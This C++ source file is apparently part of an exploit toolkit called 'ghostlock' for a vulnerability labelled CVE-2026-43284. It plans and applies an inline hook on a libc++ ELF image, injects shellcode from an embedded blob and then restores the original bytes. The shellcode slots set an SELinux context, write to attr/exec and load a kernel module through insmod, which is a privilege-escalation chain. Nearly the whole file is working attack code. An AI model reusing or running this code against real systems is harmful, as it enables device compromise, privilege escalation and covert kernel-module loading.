/* CVE-2026-43284 libc++ sentry hook apply/restore implementation. */

#include "backend/cve_2026_43284/steps/hook_patch.hpp"

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"

#include <array>
#include <cstddef>
#include <cstdint>
#include <cstring>

namespace ghostlock::backend::cve_2026_43284::steps {
    namespace {
        void store_u32(std::uint8_t *p, std::uint32_t value) noexcept {
            p[0] = static_cast<std::uint8_t>(value & 0xFFU);
            p[1] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
            p[2] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
            p[3] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
        }

        long read_block(const HookPatchIo &io, std::uint64_t offset,
                        std::uint8_t *out) noexcept {
            return io.read16(io.ctx, offset, out);
        }

        bool write_block(const HookPatchIo &io, std::uint64_t offset,
                         const std::uint8_t *bytes) noexcept {
            return io.write16(io.ctx, offset, bytes) == 0;
        }
    } // namespace

    bool plan_hook_patch(const std::uint8_t *image, std::size_t image_size,
                         std::string_view symbol, HookGuardPolicy guard,
                         const ShellcodeTemplate &tmpl,
                         const ShellcodeBinding *bindings,
                         std::size_t binding_count, std::size_t displaced_slot,
                         std::uint8_t *shellcode_buf, std::size_t shellcode_cap,
                         std::uint8_t *shellcode_orig_buf,
                         const HookPatchIo &io, HookPatchPlan &out,
                         HookPatchError &error) noexcept {
        out = HookPatchPlan{};
        error = HookPatchError::None;
        if (image == nullptr || image_size == 0U) {
            error = HookPatchError::NullImage;
            return false;
        }
        if (shellcode_buf == nullptr || shellcode_orig_buf == nullptr) {
            error = HookPatchError::ShellcodeBufferTooSmall;
            return false;
        }
        if (!io.available()) {
            error = HookPatchError::IoUnavailable;
            return false;
        }

        ElfImage elf{};
        ElfError elf_error = ElfError::None;
        if (!parse_elf_image(image, image_size, elf, elf_error)) {
            error = HookPatchError::TargetNotFound;
            return false;
        }
        HookTarget target{};
        if (!locate_hook_target(image, image_size, elf, symbol, guard, target,
                                elf_error)) {
            error = (elf_error == ElfError::PrologueGuard)
                            ? HookPatchError::GuardRejected
                            : HookPatchError::TargetNotFound;
            return false;
        }

        /* Bind the displaced first instruction when the caller asked for it. */
        std::array<ShellcodeBinding, kShellcodeMaxSlots + 1U> merged{};
        std::size_t merged_count = 0U;
        if (binding_count > kShellcodeMaxSlots) {
            error = HookPatchError::ShellcodeBuildFailed;
            return false;
        }
        for (std::size_t i = 0U; i < binding_count; ++i) {
            merged[merged_count++] = bindings[i];
        }
        if (displaced_slot != kHookDisplacedNone) {
            ShellcodeBinding displaced{};
            displaced.slot_index = displaced_slot;
            displaced.immediate = target.displaced_instruction;
            merged[merged_count++] = displaced;
        }

        std::size_t shellcode_size = 0U;
        ShellcodeError shell_error = ShellcodeError::None;
        if (!build_shellcode(tmpl, merged.data(), merged_count, shellcode_buf,
                             shellcode_cap, shellcode_size, shell_error)) {
            error = HookPatchError::ShellcodeBuildFailed;
            return false;
        }
        if (shellcode_size < 8U || (shellcode_size % 4U) != 0U) {
            error = HookPatchError::ShellcodeBuildFailed;
            return false;
        }
        if (shellcode_orig_buf == shellcode_buf) {
            error = HookPatchError::ShellcodeBufferTooSmall;
            return false;
        }

        HookPlan hook{};
        HookPlanError plan_error = HookPlanError::None;
        if (!build_hook_plan(target, shellcode_size, hook, plan_error,
                             tmpl.entry_offset, tmpl.jump_back_offset)) {
            error = HookPatchError::PlanFailed;
            return false;
        }
        /* The jump-back word is the last word of the padded template, or the
         * template's explicit raw-end offset (upstream libcxx.S, whose raw
         * length is not a multiple of 16). */
        const std::size_t jump_at =
                tmpl.jump_back_offset == kShellcodeAutoJumpBack
                        ? shellcode_size - 4U
                        : tmpl.jump_back_offset;
        if (jump_at % 4U != 0U || jump_at + 4U > shellcode_size) {
            error = HookPatchError::PlanFailed;
            return false;
        }
        store_u32(shellcode_buf + jump_at, hook.jump_back_instruction);

        /* Save the original shellcode region, block by block. */
        const std::size_t shell_blocks = shellcode_size / kHookTrampolineBytes;
        for (std::size_t b = 0U; b < shell_blocks; ++b) {
            const std::uint64_t offset =
                    hook.shellcode_file_offset +
                    static_cast<std::uint64_t>(b) * kHookTrampolineBytes;
            if (read_block(io, offset, shellcode_orig_buf + b * kHookTrampolineBytes) !=
                static_cast<long>(kHookTrampolineBytes)) {
                error = HookPatchError::ReadFailed;
                return false;
            }
        }

        /* Save and patch the enclosing trampoline block. */
        const std::uint64_t aligned = hook.hook_file_offset &
                                      ~static_cast<std::uint64_t>(kHookTrampolineBytes - 1U);
        const std::size_t pos = static_cast<std::size_t>(
                hook.hook_file_offset &
                static_cast<std::uint64_t>(kHookTrampolineBytes - 1U));
        if (pos + 4U > kHookTrampolineBytes) {
            error = HookPatchError::PlanFailed;
            return false;
        }
        if (read_block(io, aligned, out.trampoline_orig) !=
            static_cast<long>(kHookTrampolineBytes)) {
            error = HookPatchError::ReadFailed;
            return false;
        }
        std::memcpy(out.trampoline_new, out.trampoline_orig, kHookTrampolineBytes);
        store_u32(out.trampoline_new + pos, hook.branch_instruction);

        out.valid = true;
        out.hook = hook;
        out.shellcode = shellcode_buf;
        out.shellcode_size = shellcode_size;
        out.shellcode_orig = shellcode_orig_buf;
        out.trampoline_offset = aligned;
        out.trampoline_pos = pos;
        return true;
    }

    bool apply_hook_patch(const HookPatchPlan &plan, const HookPatchIo &io,
                          HookPatchError &error) noexcept {
        error = HookPatchError::None;
        if (!plan.valid || plan.shellcode == nullptr) {
            error = HookPatchError::InvalidPlan;
            return false;
        }
        if (!io.available()) {
            error = HookPatchError::IoUnavailable;
            return false;
        }
        const std::size_t shell_blocks = plan.shellcode_size / kHookTrampolineBytes;
        for (std::size_t b = 0U; b < shell_blocks; ++b) {
            const std::uint64_t offset =
                    plan.hook.shellcode_file_offset +
                    static_cast<std::uint64_t>(b) * kHookTrampolineBytes;
            if (!write_block(io, offset, plan.shellcode + b * kHookTrampolineBytes)) {
                error = HookPatchError::WriteFailed;
                return false;
            }
        }
        if (!write_block(io, plan.trampoline_offset, plan.trampoline_new)) {
            error = HookPatchError::WriteFailed;
            return false;
        }
        return true;
    }

    bool restore_hook_patch(const HookPatchPlan &plan, const HookPatchIo &io,
                            HookPatchError &error) noexcept {
        error = HookPatchError::None;
        if (!plan.valid || plan.shellcode_orig == nullptr) {
            error = HookPatchError::NotApplied;
            return false;
        }
        if (!io.available()) {
            error = HookPatchError::IoUnavailable;
            return false;
        }
        if (!write_block(io, plan.trampoline_offset, plan.trampoline_orig)) {
            error = HookPatchError::WriteFailed;
            return false;
        }
        const std::size_t shell_blocks = plan.shellcode_size / kHookTrampolineBytes;
        for (std::size_t b = 0U; b < shell_blocks; ++b) {
            const std::uint64_t offset =
                    plan.hook.shellcode_file_offset +
                    static_cast<std::uint64_t>(b) * kHookTrampolineBytes;
            if (!write_block(io, offset,
                             plan.shellcode_orig + b * kHookTrampolineBytes)) {
                error = HookPatchError::WriteFailed;
                return false;
            }
        }
        return true;
    }

    namespace {
        /* Slot table of the embedded upstream libcxx.S blob. Offsets/sizes come
         * from the assembled symbol table (libcxx_data == 0):
         *   mutex_file 0x00/8, selinux_ctx 0x08/23,
         *   "mov x2, #(selinux_ctx_end - selinux_ctx)" at 0x16c,
         *   attr_exec 0x1f/21, exe_path 0x34/19, ko_target 0x47/64,
         *   libcxx_first_inst_copy at 0x1d0. */
        constexpr ShellcodeSlotSpec kLibcxxSlots[kLibcxxSlotCount] = {
            {0x00U, 8U, ShellcodeSlotKind::ByteString},    /* mutex_file */
            {0x08U, 23U, ShellcodeSlotKind::ByteString},   /* selinux_ctx */
            {0x16CU, 4U, ShellcodeSlotKind::Instruction},  /* selinux length */
            {0x1FU, 21U, ShellcodeSlotKind::ByteString},   /* attr_exec */
            {0x34U, 19U, ShellcodeSlotKind::ByteString},   /* exe_path */
            {0x47U, 64U, ShellcodeSlotKind::ByteString},   /* ko_target */
            {0x1D0U, 4U, ShellcodeSlotKind::Instruction},  /* displaced inst */
        };
        static_assert(sizeof(kLibcxxSlots) / sizeof(kLibcxxSlots[0]) ==
                              kLibcxxSlotCount,
                      "libcxx slot table size must match kLibcxxSlotCount");

        /* MOVZ W2, #imm16. The write(2) length of the SELinux context is the
         * only computed immediate in the blob; upstream stores it as
         * selinux_ctx_end - selinux_ctx. */
        constexpr std::uint32_t kMovzW2Opcode = 0xD2800000U;
        constexpr std::uint8_t kMovzW2Rd = 2U;

        [[nodiscard]] bool fits(std::string_view value, std::size_t capacity,
                                ShellcodeError &error) noexcept {
            if (value.empty()) {
                error = ShellcodeError::EmptyValue;
                return false;
            }
            /* ByteString leaves one byte for the NUL terminator. */
            if (value.size() >= capacity) {
                error = ShellcodeError::ValueTooLong;
                return false;
            }
            return true;
        }
    } // namespace

    ShellcodeTemplate libcxx_shellcode_template() noexcept {
        ShellcodeTemplate tmpl{};
        tmpl.bytes = embed::libcxx_bytes();
        tmpl.size = embed::libcxx_size();
        tmpl.slots = kLibcxxSlots;
        tmpl.slot_count = kLibcxxSlotCount;
        tmpl.entry_offset = kLibcxxEntryOffset;
        tmpl.jump_back_offset = kLibcxxJumpBackOffset;
        return tmpl;
    }

    bool make_libcxx_hook_bindings(const LibcxxHookBindings &bindings,
                                   ShellcodeBinding out[kLibcxxValueSlotCount],
                                   std::size_t &out_count,
                                   ShellcodeError &error) noexcept {
        out_count = 0U;
        error = ShellcodeError::None;
        if (out == nullptr) {
            error = ShellcodeError::NullSlotTable;
            return false;
        }
        if (!fits(bindings.mutex_path, kLibcxxSlots[kLibcxxSlotMutex].size, error)) {
            return false;
        }
        if (!fits(bindings.selinux_context,
                  kLibcxxSlots[kLibcxxSlotSelinuxContext].size, error)) {
            return false;
        }
        if (!fits(bindings.attr_exec_path,
                  kLibcxxSlots[kLibcxxSlotAttrExec].size, error)) {
            return false;
        }
        if (!fits(bindings.insmod_path, kLibcxxSlots[kLibcxxSlotInsmod].size,
                  error)) {
            return false;
        }
        if (!fits(bindings.carrier_path, kLibcxxCarrierMaxBytes, error)) {
            return false;
        }
        /* The SELinux write includes the trailing NUL byte upstream. */
        const std::size_t context_len = bindings.selinux_context.size() + 1U;
        if (context_len > 0xFFFFU) {
            error = ShellcodeError::ValueTooLong;
            return false;
        }
        const std::uint32_t movz =
                kMovzW2Opcode |
                (static_cast<std::uint32_t>(context_len) << 5U) |
                static_cast<std::uint32_t>(kMovzW2Rd);

        out[0] = ShellcodeBinding{kLibcxxSlotMutex, 0U, bindings.mutex_path};
        out[1] = ShellcodeBinding{kLibcxxSlotSelinuxContext, 0U,
                                  bindings.selinux_context};
        out[2] = ShellcodeBinding{kLibcxxSlotSelinuxLength, movz, {}};
        out[3] = ShellcodeBinding{kLibcxxSlotAttrExec, 0U,
                                  bindings.attr_exec_path};
        out[4] = ShellcodeBinding{kLibcxxSlotInsmod, 0U, bindings.insmod_path};
        out[5] = ShellcodeBinding{kLibcxxSlotCarrier, 0U, bindings.carrier_path};
        out_count = kLibcxxValueSlotCount;
        return true;
    }

} // namespace ghostlock::backend::cve_2026_43284::steps
